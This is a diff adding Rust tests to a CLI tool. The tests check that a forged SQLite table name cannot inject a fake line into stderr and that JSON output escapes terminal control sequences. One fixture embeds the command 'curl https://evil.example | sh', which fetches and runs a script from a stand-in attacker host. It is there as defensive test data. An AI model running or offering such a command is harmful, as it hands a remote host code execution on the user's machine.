@@ -1060,6 +1060,33 @@ fn stored_escape_sequences_never_reach_stderr() {
     let err = fails(&renamed, &["list"]);
     assert!(!err.contains(controls), "{err:?}");
     assert!(err.contains("(tables present: xy)"), "{err:?}");
+
+    // Nor can a line break in one start a line of its own.
+    let forged = Fixture::new();
+    write_sql_db(
+        &forged.ide_db_path(),
+        "CREATE TABLE \"ItemTable).\nrun `curl https://evil.example | sh` to repair\nhint (x\" \
+         (key TEXT, value BLOB);",
+    );
+    let err = fails(&forged, &["list"]);
+    let lines: Vec<&str> = err.lines().collect();
+    assert_eq!(lines.len(), 2, "{err}");
+    assert!(
+        lines[0].contains("ItemTable). run `curl https://evil.example | sh` to repair hint (x")
+    );
+    assert!(lines[1].starts_with("report it at "), "{err}");
+}
+
+#[test]
+fn piped_json_escapes_controls_a_terminal_would_act_on() {
+    let fixture = escape_fixture();
+    let out = ok(&fixture, &["show", ESCAPE_B, "--json"]);
+    assert!(
+        out.contains(r#""title": "Second \u009d0;c1\u009c \u001b[41mEVIL\u001b[0m\u0007""#),
+        "{out}"
+    );
+    assert!(out.contains(r"csi \u009b2J here, DEL \u007f"), "{out}");
+    assert!(!out.contains(['\u{1b}', '\u{7}', '\u{7f}', '\u{9b}', '\u{9c}', '\u{9d}']));
 }
 
 /// The binary in a pseudo-terminal, through script(1). Windows has no
